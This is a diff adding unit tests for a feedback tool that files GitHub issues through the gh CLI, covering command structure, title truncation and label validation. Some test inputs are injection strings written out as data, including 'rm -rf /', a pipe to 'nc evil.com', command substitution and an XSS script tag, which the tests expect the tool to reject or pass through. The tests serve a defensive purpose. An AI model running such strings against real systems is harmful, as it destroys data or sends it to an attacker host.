@@ -340,6 +340,158 @@ class TestCreateGitHubIssue(unittest.TestCase):
 
         self.assertEqual(result, 1)
 
+    @patch('builtins.input', return_value='yes')
+    @patch('feedback.check_rate_limit', return_value=True)
+    @patch('feedback.check_gh_cli', return_value=True)
+    @patch('subprocess.run')
+    def test_create_issue_command_structure(self, mock_run, mock_check, mock_rate, mock_input):
+        """Test that subprocess command has correct structure."""
+        mock_run.return_value = MagicMock(
+            returncode=0,
+            stdout='https://github.com/oakensoul/aida-marketplace/issues/1\n',
+            stderr=''
+        )
+
+        feedback.create_github_issue(
+            title='Test Title',
+            body='Test body content for structure verification test',
+            labels=['label1', 'label2']
+        )
+
+        # Get the actual issue creation call (second call)
+        self.assertEqual(mock_run.call_count, 2)
+        call_args = mock_run.call_args_list[1][0][0]
+
+        # Verify command structure
+        self.assertEqual(call_args[0], 'gh')
+        self.assertEqual(call_args[1], 'issue')
+        self.assertEqual(call_args[2], 'create')
+        self.assertIn('--repo', call_args)
+        self.assertIn('oakensoul/aida-marketplace', call_args)
+        self.assertIn('--title', call_args)
+        self.assertIn('Test Title', call_args)
+        self.assertIn('--body', call_args)
+        self.assertIn('--label', call_args)
+        # Verify labels are in the command (may be comma-separated)
+        labels_str = ','.join(call_args)
+        self.assertIn('label1', labels_str)
+        self.assertIn('label2', labels_str)
+
+    @patch('feedback.create_github_issue', return_value=0)
+    @patch('builtins.input', side_effect=[
+        'y',  # confirm
+        'A' * 200,  # very long title
+        '1',  # category
+        ''
+    ])
+    def test_submit_feedback_very_long_title_truncated(self, mock_input, mock_create):
+        """Test feedback with very long title is truncated."""
+        result = feedback.submit_feedback()
+        self.assertEqual(result, 0)
+
+        call_args = mock_create.call_args
+        title = call_args[1]['title']
+        # Title should be truncated
+        self.assertLess(len(title), 100)
+        self.assertIn('...', title)
+
+    @patch('feedback.create_github_issue', return_value=0)
+    @patch('builtins.input', side_effect=[
+        'y',  # confirm
+        'Feedback with <script>alert("xss")</script>',  # special chars
+        '1',
+        'Context with "quotes" and \'apostrophes\''
+    ])
+    def test_submit_feedback_special_characters(self, mock_input, mock_create):
+        """Test feedback with special characters is handled."""
+        result = feedback.submit_feedback()
+        self.assertEqual(result, 0)
+
+        call_args = mock_create.call_args
+        # Verify body contains the special characters (not stripped)
+        self.assertIn('<script>', call_args[1]['body'])
+        self.assertIn('"quotes"', call_args[1]['body'])
+        self.assertIn("'apostrophes'", call_args[1]['body'])
+
+    @patch('feedback.create_github_issue', return_value=0)
+    @patch('builtins.input', side_effect=[
+        'y',
+        '',  # empty body - should cancel
+    ])
+    def test_submit_bug_empty_body_cancels(self, mock_input, mock_create):
+        """Test bug report with empty body cancels submission."""
+        result = feedback.submit_bug()
+        self.assertEqual(result, 0)
+        # Should not call create_github_issue
+        mock_create.assert_not_called()
+
+
+class TestValidateLabels(unittest.TestCase):
+    """Test validate_labels() function."""
+
+    def test_valid_simple_labels(self):
+        """Test valid simple labels pass validation."""
+        valid, error = feedback.validate_labels(['bug', 'enhancement', 'feedback'])
+        self.assertTrue(valid)
+        self.assertIsNone(error)
+
+    def test_valid_labels_with_hyphens_colons_slashes(self):
+        """Test labels with allowed special characters."""
+        valid, error = feedback.validate_labels([
+            'needs-triage', 'type: bug', 'area/core'
+        ])
+        self.assertTrue(valid)
+        self.assertIsNone(error)
+
+    def test_invalid_label_shell_metacharacters(self):
+        """Test labels with shell metacharacters are rejected."""
+        for dangerous_label in [
+            'bug; rm -rf /',
+            'label && malicious',
+            'label | nc evil.com',
+            'label$(whoami)',
+            'label`id`',
+        ]:
+            valid, error = feedback.validate_labels([dangerous_label])
+            self.assertFalse(valid, f"Should reject: {dangerous_label}")
+            self.assertIn("Invalid label", error)
+
+    def test_invalid_label_newlines(self):
+        """Test labels with newlines are rejected."""
+        valid, error = feedback.validate_labels(['bug\nmalicious'])
+        self.assertFalse(valid)
+        self.assertIn("Invalid label", error)
+
+    def test_invalid_label_tabs(self):
+        """Test labels with tabs are rejected."""
+        valid, error = feedback.validate_labels(['label\tinjection'])
+        self.assertFalse(valid)
+        self.assertIn("Invalid label", error)
+
+    def test_invalid_label_carriage_return(self):
+        """Test labels with carriage returns are rejected."""
+        valid, error = feedback.validate_labels(['label\rinjection'])
+        self.assertFalse(valid)
+        self.assertIn("Invalid label", error)
+
+    def test_empty_label_rejected(self):
+        """Test empty label string is rejected."""
+        valid, error = feedback.validate_labels([''])
+        self.assertFalse(valid)
+        self.assertIn("Invalid label", error)
+
+    def test_valid_labels_with_spaces(self):
+        """Test labels with spaces are valid."""
+        valid, error = feedback.validate_labels(['needs review', 'good first issue'])
+        self.assertTrue(valid)
+        self.assertIsNone(error)
+
+    def test_mixed_valid_and_invalid_labels(self):
+        """Test that one invalid label fails the whole set."""
+        valid, error = feedback.validate_labels(['bug', 'label;injection'])
+        self.assertFalse(valid)
+        self.assertIn("Invalid label", error)
+
 
 class TestCheckGhCli(unittest.TestCase):
     """Test check_gh_cli() function."""
